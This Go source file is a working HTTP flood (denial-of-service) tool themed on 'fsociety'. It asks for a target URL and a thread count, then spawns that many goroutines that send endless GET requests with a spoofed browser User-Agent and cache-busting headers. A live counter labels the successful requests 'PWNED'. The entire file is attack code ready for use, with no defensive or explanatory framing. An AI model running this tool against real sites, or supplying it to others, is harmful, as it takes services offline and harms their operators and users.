package main

import (
	"context"
	"fmt"
	"net/http"
	"os"
	"os/signal"
	"sync"
	"sync/atomic"
	"syscall"
	"time"
)

const (
	Red    = "\033[31m"
	Green  = "\033[32m"
	Yellow = "\033[33m"
	Blue   = "\033[34m"
	Cyan   = "\033[36m"
	Reset  = "\033[0m"
)

var (
	successCount uint64
	errorCount   uint64
)

func banner() {
	content, err := os.ReadFile("Fsoc.txt")
	if err != nil {
		fmt.Println(Red + ">> FSOCIETY TERMINAL <<" + Reset)
		fmt.Println(Yellow + "[!] Mask not found (Fsoc.txt missing). The revolution continues blindly." + Reset)
	} else {
		fmt.Print(Red + string(content) + Reset)
	}

	fmt.Println(Cyan + "\n------------------------------------------------------------------------------" + Reset)
	fmt.Println(Yellow + "[*] We are fsociety. | Mode: High-Concurrency Asynchronous Assault" + Reset)
	fmt.Println(Cyan + "------------------------------------------------------------------------------\n" + Reset)
}

func attack(ctx context.Context, target string, wg *sync.WaitGroup) {
	defer wg.Done()

	transport := &http.Transport{
		MaxIdleConns:        100,
		IdleConnTimeout:     90 * time.Second,
		DisableCompression:  true,
	}
	client := &http.Client{
		Transport: transport,
		Timeout:   time.Second * 5,
	}

	for {
		select {
		case <-ctx.Done():
			return
		default:
			req, _ := http.NewRequestWithContext(ctx, "GET", target, nil)
			req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36")
			req.Header.Set("Cache-Control", "no-cache")

			resp, err := client.Do(req)
			if err == nil {
				atomic.AddUint64(&successCount, 1)
				resp.Body.Close()
			} else {
				atomic.AddUint64(&errorCount, 1)
			}
		}
	}
}

func main() {
	banner()

	var target string
	var threads int

	fmt.Print(Blue + "[?] Target entity (e.g., http://evil-corp.com): " + Reset)
	fmt.Scanln(&target)
	fmt.Print(Blue + "[?] Allocate daemons (Threads): " + Reset)
	fmt.Scanln(&threads)

	if target == "" || threads <= 0 {
		fmt.Println(Red + "[!] Invalid parameters. Are you a 1 or a 0?" + Reset)
		return
	}

	ctx, cancel := context.WithCancel(context.Background())
	
	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, os.Interrupt, syscall.SIGTERM)

	fmt.Printf("\n"+Yellow+"[!] Executing payload against: %s"+Reset+"\n", target)
	fmt.Println(Yellow + "[!] Control is an illusion. Press Ctrl+C to abort." + Reset)

	var wg sync.WaitGroup
	for i := 0; i < threads; i++ {
		wg.Add(1)
		go attack(ctx, target, &wg)
	}

	go func() {
		for {
			select {
			case <-ctx.Done():
				return
			default:
				fmt.Printf("\r\033[K"+Green+"[+] PWNED: %d "+Reset+"|"+Red+" [-] BLOCKED: %d"+Reset,
					atomic.LoadUint64(&successCount),
					atomic.LoadUint64(&errorCount))
				time.Sleep(200 * time.Millisecond)
			}
		}
	}()

	<-sigChan
	fmt.Println("\n\n" + Yellow + "[!] Wiping tracks and killing daemons..." + Reset)
	cancel()
	wg.Wait()
	fmt.Println(Green + "[+] Execution halted. Goodbye, friend." + Reset)
}

